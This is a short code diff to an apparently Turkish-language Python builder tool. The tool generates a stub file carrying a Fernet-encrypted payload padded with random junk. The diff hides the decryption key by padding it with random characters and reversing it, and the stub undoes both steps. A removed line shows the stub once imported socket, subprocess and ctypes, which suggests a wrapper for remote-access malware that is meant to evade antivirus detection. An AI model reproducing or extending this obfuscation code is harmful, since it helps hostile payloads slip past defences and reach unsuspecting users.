@@ -79,6 +79,8 @@ class Ui_MainWindow(object):
             ekleneceksey10 = "".join(random.choices(toplam, k=1000))
             ekleneceksey11 = "".join(random.choices(toplam, k=1000))
             ekleneceksey12 = "".join(random.choices(toplam, k=1000))
+            key="".join(random.choices(toplam, k=1000))+key+"".join(random.choices(toplam, k=1000))
+            key=key[::-1]
 
             if sifreli_veri.startswith(b"gAAAAABp"):
                 sifreli_veri = sifreli_veri[8:]
@@ -86,7 +88,8 @@ class Ui_MainWindow(object):
  
             sifreli_veri = ekleneceksey11.encode() + sifreli_veri + ekleneceksey12.encode()
 
-            yeni_dosya_icerigi = f'''import socket, subprocess, os, time, threading, ctypes
+            yeni_dosya_icerigi = f'''
+import os
 from cryptography.fernet import Fernet
 
 
@@ -103,6 +106,8 @@ _j_ = {ekleneceksey10!r}
 
 
 _k_val = {key!r}
+_k_val=_k_val[1000:-1000]
+_k_val=_k_val[::-1]
 _p_val = {sifreli_veri!r}
 
 
